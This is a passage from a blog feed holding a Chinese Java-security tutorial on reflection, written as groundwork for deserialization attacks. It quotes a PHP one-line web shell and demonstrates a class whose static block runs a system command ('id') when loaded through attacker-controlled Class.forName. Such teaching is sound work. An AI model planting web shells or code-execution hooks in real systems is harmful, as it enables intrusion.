class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="无限debugger防调试"><a href="#无限debugger防调试" class="headerlink" title="无限debugger防调试"></a>无限debugger防调试</h4><p>​    某些页面打开调试工具会出现无限 debugger 的现象：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    可先看从零到一，无前言&lt;/p&gt;
&lt;h3 id=&quot;浏览器开发者工具F12&quot;&gt;&lt;a href=&quot;#浏览器开发者工具F12&quot; class=&quot;headerlink&quot; title=&quot;浏览器开发者工具F12&quot;&gt;&lt;/a&gt;浏览器开发者工具F12&lt;/h3&gt;&lt;p&gt;&lt;img  
   </summary>
      
    
    
    
    <category term="Python爬虫篇" scheme="http://example.com/categories/Python%E7%88%AC%E8%99%AB%E7%AF%87/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="JS" scheme="http://example.com/tags/JS/"/>
    
    <category term="JS逆向" scheme="http://example.com/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(4)-Java反射机制</title>
    <link href="http://example.com/2022/10/04/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-4-Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2022/10/04/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-4-Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</id>
    <published>2022-10-03T18:31:39.000Z</published>
    <updated>2023-04-22T08:02:36.736Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h3><p>​    对于Java反序列化漏洞来说，Java反射机制必须理解，本章专门用来说明什么是Java反射。</p><hr><h3 id="什么是Java反射"><a href="#什么是Java反射" class="headerlink" title="什么是Java反射"></a>什么是Java反射</h3><p>​    Java 反射机制允许运行中的Java程序获取自身的信息, 操作类和对象的内部属性。</p><p>​    <strong>Java 反射机制是指在程序运行时，对于任何一个类，都能知道这个类的所有属性和方法，对于任何一个实例对象 , 都能调用该对象的任何一个属性和方法。</strong></p><p>​    <strong>Java中这种 “ 动态获取信息 “ 和 “ 动态调用属性方法 “ 的机制被称为 Java 反射机制。</strong></p><p>​    <strong>实例对象可以通过反射机制获取它的类 , 类可以通过反射机制获取它的所有方法和属性 . 获取的属性可以设值 , 获取的方法可以调用。</strong></p><p>在静态语言中 , 一般对象的类型都是在编译期就确定下来的 . 而通过 Java 反射机制 , 可以动态的创建对象并调用其方法和属性 。</p><hr><h3 id="Java反射的功能"><a href="#Java反射的功能" class="headerlink" title="Java反射的功能"></a>Java反射的功能</h3><p>​    正是因为 PHP 中存在多种动态特性 , 使得开发人员能通过很少的代码来实现非常多的功能 . 比较典型的例子就是一句话木马 , 通过一行 <strong>&lt;?php @eval($_POST[cmd]);</strong> 能实现目录管理 , 命令执行 , 数据库连接 , 文件上传下载等多种多样的功能 .</p><p>​    但是 Java 本身是一门静态语言 , 无法像 PHP 那么灵活多变 . 但是通过 Java 反射机制 , 可以为自身提供一些动态特性 . 当我们在通过 IDE 写代码时 , 敲击点号” . “ , 会出现当前对象或类所包含的属性和方法 . 这里用到的就是 Java 反射机制 .</p><p>​    而且 , 反射最重要的用途是开发各种通用框架 . 很多框架都是通过XML文件来进行配置的( 例如 struts.xml , spring-*.xml 等 ) , 即所谓的框架核心配置文件 . 为了确保框架的通用性 , 程序运行时需要根据配置文件中对应的内容加载不同的类或对象 , 调用不同的方法 , 这也依赖于 Java 反射机制 .</p><p>综上所述 , Java 反射机制的功能可分为如下几点 :</p><ol><li><strong>在程序运行时查找一个对象所属的类 .</strong></li><li><strong>在程序运行时查找任意一个类的成员变量和方法 .</strong></li><li><strong>在程序运行时构造任意一个类的对象 .</strong></li><li><strong>在程序运行时调用任意一个对象的方法 .</strong></li></ol><h4 id="查找一个对象所属的类"><a href="#查找一个对象所属的类" class="headerlink" title="查找一个对象所属的类"></a>查找一个对象所属的类</h4><p>​    如何获取一个类( java.lang.Class )呢? 总的而言有三种方法 .</p><ul><li><strong>obj.getClass()</strong></li><li><strong>Class.forName(className)</strong></li><li><strong>className.class</strong></li></ul><p>​    具体的使用方法如下所示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查找对象所属的类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">getClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">getClass</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">getClass</span> <span class="variable">gc1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">getClass</span>(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        <span class="comment">//已知上下文中存在某个类的实例对象名称</span></span><br><span class="line">        <span class="comment">//可以调用obj.getClass()获取实例对象所属的类</span></span><br><span class="line">        System.out.println(<span class="string">&quot;通过obj.getClass()获得所属的类：&quot;</span> + gc1.getClass());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//已知某个类的名称</span></span><br><span class="line">        <span class="comment">//可以调用Class.getClass(&quot;className&quot;)来获取类</span></span><br><span class="line">        System.out.println(<span class="string">&quot;通过Class.forName(&#x27;className&#x27;)获取类：&quot;</span> + Class.forName(<span class="string">&quot;getClass&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当已经加载了某个类</span></span><br><span class="line">        <span class="comment">//可以通过className.class属性来获取类</span></span><br><span class="line">        System.out.println(<span class="string">&quot;通过className.class属性获取类：&quot;</span>+getClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-154333.png"                      alt="image-20230415234333237"                ></p><p>​    针对不同的情况 , 可以用不同的方法来获取类 .</p><p>​    需要注意的是 : forName( ) 函数有两个重载 , 如下所示 :</p><blockquote><p><strong>Class.forName( String className )</strong></p><p><strong>Class.forName( String className , Boolean initialize , ClassLoader loader )</strong></p><ol><li>String className : 类名</li><li>Boolean initialize : 是否进行类初始化</li><li>ClassLoader loader : 加载器( 告诉 Java 虚拟机如何加载获取的类 , Java 默认根据类名( 即类的绝对路径 , 例如 java.lang.Runtime( ) )来加载类，Runtime类在Java安全从零到一（3）中讲过 )</li></ol><p>其中 , 第一种方法是对第二种方法的封装 , 存在以下对应关系 :</p><p>Class.forName( String className ) == Class.forName( String className , True , currentLoader )</p></blockquote><p>​    那么这个类初始化是指什么呢 ? </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类初始化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;普通代码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;test1&quot;</span>);<span class="comment">//类初始化，初始化时会加载静态代码块</span></span><br><span class="line">        System.out.printf(String.valueOf(cls));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-155645.png"                      alt="image-20230415235644526"                ></p><p>​    这个部分在我的Java安全从零到一(2)中讲过，可以详细翻看</p><p>​    结果表明 , 在 Java 类初始化时 , 会执行静态代码块中的内容 .</p><p>​    那也就是说 , 如果我们能控制一个类 , 那么就可以通过在类中添加包含恶意代码的静态代码块 . 当类初始化时 , 默认会自动执行恶意代码. 如下所示 :</p><ol><li>假设存在如下代码 :</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">vul</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">vul</span><span class="params">(String string)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class.forName(string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">vul</span> <span class="variable">v</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">vul</span>(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        <span class="comment">//实例化 vul 类，调用构造方法 vul, vul()方法中通过 Class.forName(className) 方法来获取类,获取类时默认进行类初始化，调用静态代码块 static&#123;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时 , 如果我们能控制 test2类 , 那么就能执行任意代码 .</p><ol start="2"><li>构造恶意的 test2 类：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//执行系统命令</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="comment">//获取p的标准输入流作为输入字节流</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">            <span class="comment">//字节流转化为字符流</span></span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">            <span class="comment">//将字符流存入缓冲区</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//逐一读取字符流中缓冲区的每一行</span></span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.printf(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这个恶意类的内容是在该类静态代码块中 , 通过 java.lang.Runtime.getRuntime( ).exec( ) 执行系统命令 , 并将返回字节流转换为字符流 , 存入缓冲区后逐行读取并输出 .</p><ol start="3"><li>当调用 vul 类时 , 会自动执行恶意代码 .</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-161243.png"                      alt="image-20230416001243463"                ></p><h4 id="查找任意一个类的成员变量和方法"><a href="#查找任意一个类的成员变量和方法" class="headerlink" title="查找任意一个类的成员变量和方法"></a>查找任意一个类的成员变量和方法</h4><p>如何获取某一个类的所有方法呢? 总的来说有三种方法 .</p><ul><li><strong>className.getMethod(functionName , [parameterTypes.class])</strong></li><li><strong>className.getMethods()</strong></li><li><strong>className.getDeclaredMethods()</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查找一个类的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">getMethod</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">methodClass</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> a + b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = methodClass.class;<span class="comment">//通过className.class获取类</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类方法的三种方式</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        Method[] methods = cls.getMethods();<span class="comment">//获取某个类的public方法</span></span><br><span class="line">        Method[] declareMethods = cls.getDeclaredMethods();<span class="comment">//获取某个类的公共，保护，默认方法，不包括继承</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//输出结果</span></span><br><span class="line">        <span class="comment">//className.getMethod</span></span><br><span class="line">        System.out.println(<span class="string">&quot;getMethod获取方法&quot;</span> + method);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\ngetMethods获取的方法:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\ngetDeclaredMethods获取的方法&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Method m : declareMethods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-163739.png"                      alt="image-20230416003739744"                ></p><p>​    getMethod( ) : 返回类中一个特定的方法 . 其中第一个参数为方法名称 , 后面的参数为方法的参数对应 Class 的对象 .</p><p>​    getMethods( ) : 返回某个类的所有公用（public）方法 , 包括其继承类的公用方法 .</p><p>​    getDeclaredMethods( ) : 返回某个类或接口声明的所有方法 , 包括公共、保护、默认（包）访问和私有方法 , 但不包括其继承类的方法 .</p><p>补充：$是内部类的意思</p><h4 id="构造任意一个类的对象"><a href="#构造任意一个类的对象" class="headerlink" title="构造任意一个类的对象"></a>构造任意一个类的对象</h4><p>​    上文提到了可以通过三种方式来获取类 , 那么如果获取一个实例对象呢 ?</p><p>​    <strong>通过 className.newInstance() 来构建一个实例对象.</strong></p><p>​    我们都知道在类实例化时会调用构造函数 , 而构造函数又分为 “ 有参构造函数 “ 和 “ 无参构造函数 “ . 然而 className.newInstance() 没有参数 , 只能调用无参构造函数（注意，该方法已经被弃用，新的在代码中） . 如果我们想要调用有参构造函数 , 就必须依赖于 Class 类的 getConstructor() 方法 .</p><p>​    <strong>通过 Class 类的 getConstructor() 方法 , 可以获取 Constructor 类的一个实例 , Constructor 类也存在一个 newInstance() 方法 , 不过该方法可以携带参数 . 用该方法来创建实例对象可以调用有参构造函数 .</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造任意一个类的对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">newInstance</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//无参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">newInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是无参构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//有参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">newInstance</span><span class="params">(String str)</span>&#123;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;newInstance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;通过className.newInstance()创建实例对象，默认调用无参构造函数,但是该方法已被弃用&quot;</span>);</span><br><span class="line">        <span class="type">newInstance</span> <span class="variable">obj1</span> <span class="operator">=</span> (newInstance)cls.newInstance();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;通过className.getConstrutor().newInstance()创建实例对象，可以添加参数调用有参构造函数&quot;</span>);</span><br><span class="line">        <span class="type">newInstance</span> <span class="variable">obj2</span> <span class="operator">=</span> (newInstance)cls.getConstructor(String.class).newInstance(<span class="string">&quot;这里有参构造函数&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;此处为新的无参构造函数调用&quot;</span>);</span><br><span class="line">        <span class="type">newInstance</span> <span class="variable">obj3</span> <span class="operator">=</span> (newInstance)cls.getDeclaredConstructor().newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-165449.png"                      alt="image-20230416005449429"                ></p><ul><li><strong>className.newInstance()</strong></li><li><strong>className.getConstructor( parameterType ).newInstance( parameterName )</strong></li><li><strong>className.getDeclaredConstructor().newInstance()</strong></li></ul><p>​    因此 , 我们可以通过 newInstance() 方法来构造任何一个类的对象 . 并且可以选择是调用其无参构造方法 , 还是有参的构造方法 .</p><h4 id="调用任意一个实例对象的方法"><a href="#调用任意一个实例对象的方法" class="headerlink" title="调用任意一个实例对象的方法"></a>调用任意一个实例对象的方法</h4><p>​    有了实例对象 , 如何调用调用该对象的方法呢 ?</p><p>​    一般来说 , 可以通过 objectName.functionName() 这种格式来调用实例方法 . 举个例子 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用任意一个实例对象的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">invoke</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">prt</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;invoke&quot;</span>);</span><br><span class="line">        <span class="type">invoke</span> <span class="variable">ivk</span> <span class="operator">=</span> (invoke) cls.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//通过objectName.functionName()来调用实例方法</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> ivk.prt(name);</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-171936.png"                      alt="image-20230416011936100"                ></p><p>​    但是在很多情况下 , 并不知道类名, 也就无法 new 出实例对象 , 更别提调用实例对象的方法了 . 当遇到这种情况时 , 就需要使用 Java 反射来调用实例对象的方法了 .</p><p>以下就是思路了：</p><ul><li><p>不知道类怎么办 ?</p><p>我们可以通过 obj.getClass() , Class.forName(className) , className.class 来获取类.</p></li><li><p>不知道类有哪些方法怎么办 ?</p><p>我们可以通过 className.getMethod(functionName , [parameterTypes.class]) , className.getMethods() , className.getDeclaredMethods() 来获取类的方法.</p></li><li><p>不能 new 出实例对象怎么办 ?</p><p>我们可以通过 className.newInstance() , className.getConstructor().newInstance() 来构造实例对象 .</p></li><li><p>那如何调用实例对象的方法呢 ?</p><p>通过 invoke() 方法来调用任何一个实例对象的方法 !</p></li></ul><p>看看定义，它是Method对象调用的：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-172913.png"                      alt="image-20230416012912643"                ></p><p>我们把上面的代码改成invoke获得的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用任意一个实例对象的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">invoke</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">prt</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;invoke&quot;</span>);</span><br><span class="line">        <span class="type">invoke</span> <span class="variable">ivk</span> <span class="operator">=</span> (invoke) cls.getDeclaredConstructor().newInstance();</span><br><span class="line"><span class="comment">//        String str1 = ivk.prt(name);</span></span><br><span class="line"><span class="comment">//        System.out.println(str1);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;prt&quot;</span>, String.class).invoke(ivk, name);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-172512.png"                      alt="image-20230416012511759"                ></p><p><strong>Method.invoke(obj , args[])</strong></p><p>​    如上文所说的 , 通过Java反射机制来获取类 , 获取类的方法 , 构造实力对象 , 最终调用实例方法 .</p><p>​    <strong>注 : 官方文档中提到了一些比较有意思的东西 , 需要注意 .</strong></p><p>​    <strong>如果要调用的方法是静态的 , 则忽略 obj 参数 .这个点其实比较好理解 , 我们知道Java中调用静态方法是无需创建实例对象的 , 所以这里可以省略 obj 参数 .</strong></p><p>​    <strong>如果要调用的方法的形参个数为 “ 0 “ , 那么 args[] 数组的长度可以为 “ 0 “ 或者 “ null “ . 这个点其实也没啥说的 , args[] 数组本就是要调用方法的参数 , 既然目标方法没有参数 , 这里自然也就不用写 .</strong></p><hr><p>​    关于反射的流程以及代码基本介绍完全了，参考了很多师傅的文章博客CSDN等总结，所有的代码可以直接复制跑通，本人均是跑通成功后的代码，下面介绍一下RCE(Remote Code 